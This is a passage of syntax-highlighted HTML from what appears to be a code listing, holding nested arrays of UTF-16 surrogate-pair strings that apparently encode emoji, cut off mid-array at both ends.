<span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, 